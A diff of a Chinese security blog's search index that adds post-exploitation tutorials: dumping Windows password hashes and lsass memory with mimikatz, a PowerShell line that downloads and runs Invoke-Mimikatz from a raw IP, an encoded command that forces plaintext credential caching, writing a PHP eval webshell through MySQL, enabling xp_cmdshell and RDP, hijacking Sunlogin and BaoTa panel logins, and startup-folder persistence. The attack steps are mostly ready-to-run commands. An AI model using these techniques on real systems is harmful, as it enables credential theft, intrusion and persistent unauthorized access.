@@ -1,7 +1,185 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>PHP-任意文件读取/下载漏洞.md</title>
+    <title>内存中获取管理员明文密码</title>
+    <url>/posts/a8076874.html</url>
+    <content><![CDATA[<h1 id="内存中获取管理员明文密码"><a href="#内存中获取管理员明文密码" class="headerlink" title="内存中获取管理员明文密码"></a>内存中获取管理员明文密码</h1><h2 id="注册表导出hash解密"><a href="#注册表导出hash解密" class="headerlink" title="注册表导出hash解密"></a>注册表导出hash解密</h2><p>导出<code>sam.hiv</code>文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg save hklm\sam C:\wwwroot\sam.hiv</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020112533.png" alt="image.png"><br>导出<code>sys.hiv</code>文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg save hklm\system C:\wwwroot\sys.hiv</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020112534.png" alt="image.png"><br>下载这两个文件，放到<code>mimikatz</code>目录中：<br><img src="https://qiniu.hzktester.top/tp2020112535.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112536.png" alt="image.png"><br>双击启动<code>mimikatz.exe</code>文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">log</span>		//生成日志文件</span><br><span class="line">lsadump::sam /sam:Sam.hiv /system:Sys.hiv	//抓取密码</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020112537.png" alt="image.png"><br>使用以下解码平台解密<code>NTLM</code>：</p>
+<ul>
+<li><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></li>
+<li><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></li>
+</ul>
+<p>由于我的密码是强密码，所有没有解密出来：<br><img src="https://qiniu.hzktester.top/tp2020112538.png" alt="image.png"><br>我用自己密码加密。可以看出，结果是正确的</p>
+<h2 id="内存中获取明文"><a href="#内存中获取明文" class="headerlink" title="内存中获取明文"></a>内存中获取明文</h2><p>需要满足两个条件：</p>
+<ul>
+<li>用户登录过该系统</li>
+<li>登陆后未被重启过<h3 id="可以从内存中获取明文密码："><a href="#可以从内存中获取明文密码：" class="headerlink" title="可以从内存中获取明文密码："></a>可以从内存中获取明文密码：</h3>使用命令<code>ver</code>查看版本：版本低于<code>6.3</code>的可以从内存中获取明文密码：<br><img src="https://qiniu.hzktester.top/tp2020112539.png" alt="image.png"><h4 id="procdump获取内存文件"><a href="#procdump获取内存文件" class="headerlink" title="procdump获取内存文件"></a>procdump获取内存文件</h4>上传<code>procdump</code>文件到目标服务器：<br>执行命令：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:/wwwroot/procdumpx64.exe  -accepteula -ma lsass.exe C:/wwwroot/lsass.dmp</span><br></pre></td></tr></table></figure>
+<img src="https://qiniu.hzktester.top/tp2020112540.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112541.png" alt="image.png"><br>下载<code>lsass.dmp</code>到<code>mimikatz</code>目录中：<br><img src="https://qiniu.hzktester.top/tp2020112542.png" alt="image.png"><br>执行以下命令：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">log</span>	</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
+然后查看日志文件<code>mimikatz.log</code>：<br><img src="https://qiniu.hzktester.top/tp2020112543.png" alt="image.png"><br>可以看到已经拿到了明文密码<h4 id="任务管理器导出内存文件"><a href="#任务管理器导出内存文件" class="headerlink" title="任务管理器导出内存文件"></a>任务管理器导出内存文件</h4>从任务管理器中找到<code>lsass.exe</code>进程：</li>
+</ul>
+<p>右键-创建转储文件<br><img src="https://qiniu.hzktester.top/tp2020112544.png" alt="image.png"><br>拿到<code>lsass.DMP</code>文件后还是使用<code>mimiktz</code>的命令即可：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">log</span>	</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
+<h4 id="Powershell-mimikatz"><a href="#Powershell-mimikatz" class="headerlink" title="Powershell+mimikatz"></a>Powershell+mimikatz</h4><p>上传<code>Invoke-Mimikatz.ps1</code>到目标服务器<br><img src="https://qiniu.hzktester.top/tp2020112545.png" alt="image.png"><br>使用以下命令直接获取明文密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://139.155.236.39/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020112546.png" alt="image.png"><br>明文密码在这儿：<br><img src="https://qiniu.hzktester.top/tp2020112547.png" alt="image.png"></p>
+<h4 id="Mimikatz直接读取"><a href="#Mimikatz直接读取" class="headerlink" title="Mimikatz直接读取"></a>Mimikatz直接读取</h4><p>上传<code>mimikatz_x64</code>文件到目标服务器上：<br><img src="https://qiniu.hzktester.top/tp2020112548.png" alt="image.png"><br>直接运行即可得到明文密码：<br><img src="https://qiniu.hzktester.top/tp2020112549.png" alt="image.png"></p>
+<h3 id="无法从内存中获取明文密码"><a href="#无法从内存中获取明文密码" class="headerlink" title="无法从内存中获取明文密码"></a>无法从内存中获取明文密码</h3><h4 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h4><p>执行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Powershell -ENC dAByAHkAIAB7ACAATgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBMAE0AOgBcAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB2AGkAZABlAHIAcwBcAFcARABpAGcAZQBzAHQAIAAtAE4AYQBtAGUAIABVAHMAZQBMAG8AZwBvAG4AQwByAGUAZABlAG4AdABpAGEAbAAgAC0AVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0AVgBhAGwAdQBlACAAMQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAH0AYwBhAHQAYwBoACAAewAgAH0A</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020112550.png" alt="image.png"><br>重启服务器后使用以上操作就可以在内存中获取明文密码了</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>getshell后启动远程连接</title>
+    <url>/posts/5413ca70.html</url>
+    <content><![CDATA[<h1 id="getshell后启动远程连接"><a href="#getshell后启动远程连接" class="headerlink" title="getshell后启动远程连接"></a>getshell后启动远程连接</h1><h1 id="查询服务器远程连接："><a href="#查询服务器远程连接：" class="headerlink" title="查询服务器远程连接："></a>查询服务器远程连接：</h1><h2 id="进程查询："><a href="#进程查询：" class="headerlink" title="进程查询："></a>进程查询：</h2><p>查询进程服务名称为<code>TermService</code>的进行<code>PID</code>号：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020112529.png" alt="image.png"><br>查询<code>PID</code>号对应开启的端口号：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -ano | find <span class="string">&quot;1744&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020112530.png" alt="image.png"></p>
+<h2 id="注册表查询："><a href="#注册表查询：" class="headerlink" title="注册表查询："></a>注册表查询：</h2><p>通过以下命令查询注册表：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v <span class="string">&quot;PortNumber&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020112531.png" alt="image.png"><br>使用系统计算器解码：<br><img src="https://qiniu.hzktester.top/tp2020112532.png" alt="image.png"></p>
+<h2 id="服务器未开始远程连接："><a href="#服务器未开始远程连接：" class="headerlink" title="服务器未开始远程连接："></a>服务器未开始远程连接：</h2><p>开启远程连接命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+<p>关闭远程连接命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>phpmyadmin，sqlserver，向日葵提权.md</title>
+    <url>/posts/89382ca7.html</url>
+    <content><![CDATA[<h1 id="phpmyadmin提权"><a href="#phpmyadmin提权" class="headerlink" title="phpmyadmin提权"></a>phpmyadmin提权</h1><h2 id="SQL语句写getshell"><a href="#SQL语句写getshell" class="headerlink" title="SQL语句写getshell"></a>SQL语句写getshell</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul>
+<li>已知<code>web</code>应用绝对路径。</li>
+<li><code>mysql</code>配置文件中<code>secure_file_priv</code>的值为空。</li>
+</ul>
+<h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>设置<code>secure_file_priv</code>的值为空：<br><img src="https://qiniu.hzktester.top/tp2020112515.png" alt="image"><br>重启配置生效：<br><img src="https://qiniu.hzktester.top/tp2020112516.png" alt="image"></p>
+<h4 id="查看是否具有写入权限："><a href="#查看是否具有写入权限：" class="headerlink" title="查看是否具有写入权限："></a>查看是否具有写入权限：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020112517.png" alt="image"></p>
+<ul>
+<li><code>secure_file_priv</code>为<code>null</code>表示不允许导入导出；</li>
+<li><code>secure_file_priv</code>指定文件夹时，表示mysql的导入导出只能在指定的文件夹；</li>
+<li><code>secure_file_priv</code>没有设置时，则表示没有任何限制；</li>
+</ul>
+<h4 id="查web绝对路径"><a href="#查web绝对路径" class="headerlink" title="查web绝对路径"></a>查<code>web</code>绝对路径</h4><ul>
+<li>利用mysql的特性<code>select @@basedir</code><br><img src="https://qiniu.hzktester.top/tp2020112518.png" alt="image"><br>这里很明显是用了宝塔集成环境，那么默认路径是<code>C:/wwwroot</code></li>
+<li><code>phpinfo</code>信息泄露<br><img src="https://qiniu.hzktester.top/tp2020112519.png" alt="image"></li>
+<li>通过报错</li>
+</ul>
+<h4 id="写入一句话木马："><a href="#写入一句话木马：" class="headerlink" title="写入一句话木马："></a>写入一句话木马：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span><span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">&#x27;C://wwwroot//shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020112520.png" alt="image"><br>使用蚁剑连接<br><img src="https://qiniu.hzktester.top/tp2020112521.png" alt="image"></p>
+<h2 id="日志变量getshell"><a href="#日志变量getshell" class="headerlink" title="日志变量getshell"></a>日志变量getshell</h2><ol>
+<li>开启日志保存并修改保存位置<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log = <span class="string">&quot;ON&quot;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file=<span class="string">&#x27;C://wwwroot//shell2.php&#x27;</span>; </span><br><span class="line">```  </span><br><span class="line">2. 我们在`SQL`查询的框中写入</span><br><span class="line">```sql</span><br><span class="line"><span class="keyword">select</span> <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure></li>
+<li>蚁剑连接<br><img src="https://qiniu.hzktester.top/tp2020112522.png" alt="image"></li>
+</ol>
+<h1 id="SQL-server提权"><a href="#SQL-server提权" class="headerlink" title="SQL server提权"></a>SQL server提权</h1><p>开启<code>xp_cmdshell</code>：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sp_configure &#x27;<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">&#x27;,1</span></span><br><span class="line"><span class="string">reconfigure</span></span><br><span class="line"><span class="string">go</span></span><br><span class="line"><span class="string">sp_configure &#x27;</span>xp_cmdshell<span class="string">&#x27;,1</span></span><br><span class="line"><span class="string">reconfigure</span></span><br><span class="line"><span class="string">go</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020112523.png" alt="image"><br>执行系统命令：<br><img src="https://qiniu.hzktester.top/tp2020112524.png" alt="image"></p>
+<h1 id="向日葵远程连接提权："><a href="#向日葵远程连接提权：" class="headerlink" title="向日葵远程连接提权："></a>向日葵远程连接提权：</h1><p>如果目标机器安装了向日葵：<br>默认位置：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:/Program Files/Oray/SunLogin/SunloginClient</span><br></pre></td></tr></table></figure>
+<p>我们在自己电脑上同样安装一个向日葵，修改自己的配置文件改为他的配置文件：<br><img src="https://qiniu.hzktester.top/tp2020112525.png" alt="image"><br>这时，连接密码就一样了：<br><img src="https://qiniu.hzktester.top/tp2020112526.png" alt="image"><br>识别码在这里：<br><img src="https://qiniu.hzktester.top/tp2020112527.png" alt="image"><br>然后就远程连接了他的电脑：<br><img src="https://qiniu.hzktester.top/tp2020112528.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>中间件降权，宝塔偷梁换柱提权</title>
+    <url>/posts/7ab30567.html</url>
+    <content><![CDATA[<h1 id="windwos用户-用户组"><a href="#windwos用户-用户组" class="headerlink" title="windwos用户/用户组"></a>windwos用户/用户组</h1><h2 id="net-user：用户操作"><a href="#net-user：用户操作" class="headerlink" title="net user：用户操作"></a>net user：用户操作</h2><p>以下以操作用户名<code>test</code>为例</p>
+<ul>
+<li><code>net user test 密码 /add</code>：添加用户</li>
+<li><code>net user test 密码</code>：修改用户名密码</li>
+<li><code>net user test</code>：查看<code>test</code>用户详情</li>
+<li><code>net user test /active:yes</code>：激活<code>test</code>用户</li>
+<li><code>net user test /active:no</code>：禁用<code>test</code>用户</li>
+</ul>
+<h2 id="net-localgroup：用户组操作"><a href="#net-localgroup：用户组操作" class="headerlink" title="net localgroup：用户组操作"></a>net localgroup：用户组操作</h2><ul>
+<li><code>net localgroup Administrators</code>：查询<code>Administrators</code>用户组成员</li>
+<li><code>net localgroup Administrators test /add</code>：添加<code>test</code>到<code>Administrators</code>用户组</li>
+<li><code>net localgroup Administrators test /del</code>：从<code>Administrators</code>用户组删除<code>test</code></li>
+</ul>
+<h1 id="默认可写目录"><a href="#默认可写目录" class="headerlink" title="默认可写目录"></a>默认可写目录</h1><ul>
+<li>windows：<code>C:/Windows/Temp</code></li>
+<li>linux：<code>/tmp</code></li>
+</ul>
+<h1 id="宝塔中间件降权"><a href="#宝塔中间件降权" class="headerlink" title="宝塔中间件降权"></a>宝塔中间件降权</h1><h2 id="Apache使用www用户运行"><a href="#Apache使用www用户运行" class="headerlink" title="Apache使用www用户运行"></a>Apache使用www用户运行</h2><p><img src="https://qiniu.hzktester.top/tp2020112501.png" alt="image.png"></p>
+<h2 id="Mysql使用mysql用户运行"><a href="#Mysql使用mysql用户运行" class="headerlink" title="Mysql使用mysql用户运行"></a>Mysql使用mysql用户运行</h2><p><img src="https://qiniu.hzktester.top/tp2020112502.png" alt="image.png"></p>
+<h1 id="getshell之后登录宝塔"><a href="#getshell之后登录宝塔" class="headerlink" title="getshell之后登录宝塔"></a>getshell之后登录宝塔</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>需要管理员权限<br><img src="https://qiniu.hzktester.top/tp2020112503.png" alt="image.png"></p>
+<h2 id="查看宝塔面板登录入口"><a href="#查看宝塔面板登录入口" class="headerlink" title="查看宝塔面板登录入口"></a>查看宝塔面板登录入口</h2><p>默认存储位置：<code>C:/BtSoft/panel/data/admin_path.pl</code><br><img src="https://qiniu.hzktester.top/tp2020112504.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112505.png" alt="image.png"></p>
+<h2 id="下载查看宝塔数据库文件"><a href="#下载查看宝塔数据库文件" class="headerlink" title="下载查看宝塔数据库文件"></a>下载查看宝塔数据库文件</h2><p>默认位置：<code>C:/BtSoft/panel/data</code><br><img src="https://qiniu.hzktester.top/tp2020112506.png" alt="image.png"><br>找到<code>users</code>表的值。密码采用了<code>MD5</code>加密<br><img src="https://qiniu.hzktester.top/tp2020112507.png" alt="image.png"><br>这里我用<code>123456</code>的<code>MD5</code>密文：<br><img src="https://qiniu.hzktester.top/tp2020112508.png" alt="image.png"><br>修改后，注意将新建的用户id改为1：<br><img src="https://qiniu.hzktester.top/tp2020112509.png" alt="image.png"><br>使用大马覆盖掉原本的<code>default.db</code>文件<br><img src="https://qiniu.hzktester.top/tp2020112510.png" alt="image.png"><br>使用<code>test</code>，<code>123456</code>登录成功<br><img src="https://qiniu.hzktester.top/tp2020112511.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112512.png" alt="image.png"><br>之后把<code>default.db</code>文件改回原来的重新覆盖即可</p>
+<h1 id="getshell之后寻找mysql密码"><a href="#getshell之后寻找mysql密码" class="headerlink" title="getshell之后寻找mysql密码"></a>getshell之后寻找mysql密码</h1><h2 id="安装dedecms"><a href="#安装dedecms" class="headerlink" title="安装dedecms"></a>安装dedecms</h2><p><img src="https://qiniu.hzktester.top/tp2020112513.png" alt="image.png"><br>利用大马找到密码：<br><img src="https://qiniu.hzktester.top/tp2020112514.png" alt="image.png"></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网权限基础</title>
+    <url>/posts/50d3edd2.html</url>
+    <content><![CDATA[<h1 id="权限划分"><a href="#权限划分" class="headerlink" title="权限划分"></a>权限划分</h1><h2 id="Windwos权限"><a href="#Windwos权限" class="headerlink" title="Windwos权限"></a>Windwos权限</h2><ul>
+<li><code>SYSTEM</code>：系统权限</li>
+<li><code>Administrator</code>：管理员权限</li>
+<li><code>User</code>：普通用户权限</li>
+</ul>
+<h2 id="Linux权限"><a href="#Linux权限" class="headerlink" title="Linux权限"></a>Linux权限</h2><ul>
+<li><code>root</code>：最高权限</li>
+<li><code>user</code>：普通用户权限</li>
+</ul>
+<h2 id="shell权限"><a href="#shell权限" class="headerlink" title="shell权限"></a>shell权限</h2><p><code>shell</code>权限是由当前执行该服务（进程）的用户的权限决定的</p>
+<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h2><h3 id="启动项维持"><a href="#启动项维持" class="headerlink" title="启动项维持"></a>启动项维持</h3><ul>
+<li>用户启动项：<code>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
+<li>公共启动项：<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code></li>
+</ul>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="windwos系统"><a href="#windwos系统" class="headerlink" title="windwos系统"></a>windwos系统</h2><p>当拿到<code>getshell</code>之后，是<code>user</code>权限</p>
+<ul>
+<li>上传具有诱惑性的木马文件等管理员打开</li>
+<li>数据库执行命令</li>
+<li>上传phpinfo查看未被禁止的命令函数</li>
+<li>查看容器是否可以解析其他脚本</li>
+</ul>
+<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><ul>
+<li>MYSQL</li>
+<li>SQL server</li>
+</ul>
+<h1 id="拿到shell之后的操作"><a href="#拿到shell之后的操作" class="headerlink" title="拿到shell之后的操作"></a>拿到shell之后的操作</h1><p>查看操作系统、权限、是否可以执行命令、是否允许跨目录、容器</p>
+<h2 id="查看是否可以执行命令："><a href="#查看是否可以执行命令：" class="headerlink" title="查看是否可以执行命令："></a>查看是否可以执行命令：</h2><ul>
+<li><code>phpinfo()</code>：disable_functions</li>
+</ul>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP-任意文件读取/下载漏洞</title>
     <url>/posts/53895abe.html</url>
     <content><![CDATA[<h1 id="危害说明"><a href="#危害说明" class="headerlink" title="危害说明"></a>危害说明</h1><p>下载服务器任意文件，例如脚本代码、系统配置文件、等等可用的代码进行代码审计或是获取系统<code>ssh</code>进行登录、获取数据库账号密码进行连接等等</p>
 <h1 id="任意文件读取-利用与代码"><a href="#任意文件读取-利用与代码" class="headerlink" title="任意文件读取-利用与代码"></a>任意文件读取-利用与代码</h1><h2 id="例子一：读取文件"><a href="#例子一：读取文件" class="headerlink" title="例子一：读取文件"></a>例子一：读取文件</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    readfile($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -258,7 +436,7 @@
 <h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://blog.csdn.net/qq_36119192/article/details/84863268">https://blog.csdn.net/qq_36119192/article/details/84863268</a><br><a href="https://blog.csdn.net/wsnbbz/article/details/104802100">https://blog.csdn.net/wsnbbz/article/details/104802100</a><br><a href="https://www.freebuf.com/articles/system/163144.html">https://www.freebuf.com/articles/system/163144.html</a></p>
 ]]></content>
       <categories>
-        <category>提权</category>
+        <category>内网渗透</category>
       </categories>
       <tags>
         <tag>UDF提权</tag>
@@ -3798,57 +3976,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Web基础之信息泄露（下）</title>
-    <url>/posts/5ca8b352.html</url>
-    <content><![CDATA[<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>以下需要用到python脚本：Githack<br><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p>
-<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p><img src="https://qiniu.hzktester.top/tp2020081824.png" alt="image"></p>
-<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>查看历史记录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>
-<p>切换版本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset</span><br></pre></td></tr></table></figure>
-<p>对比两次提交</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure>
-<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><ol>
-<li><p>扫描发现 .git 泄露</p>
-<p> <img src="https://qiniu.hzktester.top/tp2020081825.png" alt="image"></p>
-</li>
-<li><p>使用 GitHack 工具 clone 目标源代码到本地</p>
-<p> <img src="https://qiniu.hzktester.top/tp2020081826.png" alt="image"></p>
-</li>
-<li><p>执行 git log 查看历史记录</p>
-<p> <img src="https://qiniu.hzktester.top/tp2020081827.png" alt="image"></p>
-</li>
-<li><p>执行 git show 查看提交详情</p>
-<p> <img src="https://qiniu.hzktester.top/tp2020081828.png" alt="image"></p>
-<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>git 泄露 .git/refs/stash</p>
-</li>
-</ol>
-<p>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</p>
-<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ol>
-<li><p>尝试访问敏感目录，发现.git目录<strong><a href="http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config">http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config</a></strong></p>
-</li>
-<li><p>利用GitHack 工具将网站源代码 clone 到本地</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
-<p> <img src="https://qiniu.hzktester.top/tp2020081829.png" alt="image"></p>
-</li>
-<li><p>查看 <strong>.git/refs/stash</strong> 找到 <strong>stash</strong> 对应的 <strong>hash</strong></p>
-<p> <img src="https://qiniu.hzktester.top/tp2020081830.png" alt="image"></p>
-</li>
-<li><p>git diff 9dbafcb8c4629b4b843991b6ebe5eca874812fc4 得到flag</p>
-<p> <img src="https://qiniu.hzktester.top/tp2020081831.png" alt="image"></p>
-</li>
-</ol>
-<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="https://qiniu.hzktester.top/tp2020081832.png" alt="image"></p>
-<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><img src="https://qiniu.hzktester.top/tp2020081833.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081834.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>信息泄露</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Web基础之信息泄露（上）</title>
     <url>/posts/e414d437.html</url>
     <content><![CDATA[<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><img src="https://qiniu.hzktester.top/tp2020081801.png" alt="image"></p>
@@ -3909,6 +4036,84 @@
       </tags>
   </entry>
   <entry>
+    <title>Web基础之信息泄露（下）</title>
+    <url>/posts/5ca8b352.html</url>
+    <content><![CDATA[<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>以下需要用到python脚本：Githack<br><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p>
+<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p><img src="https://qiniu.hzktester.top/tp2020081824.png" alt="image"></p>
+<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>查看历史记录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>
+<p>切换版本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset</span><br></pre></td></tr></table></figure>
+<p>对比两次提交</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure>
+<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><ol>
+<li><p>扫描发现 .git 泄露</p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081825.png" alt="image"></p>
+</li>
+<li><p>使用 GitHack 工具 clone 目标源代码到本地</p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081826.png" alt="image"></p>
+</li>
+<li><p>执行 git log 查看历史记录</p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081827.png" alt="image"></p>
+</li>
+<li><p>执行 git show 查看提交详情</p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081828.png" alt="image"></p>
+<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>git 泄露 .git/refs/stash</p>
+</li>
+</ol>
+<p>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ol>
+<li><p>尝试访问敏感目录，发现.git目录<strong><a href="http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config">http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config</a></strong></p>
+</li>
+<li><p>利用GitHack 工具将网站源代码 clone 到本地</p>
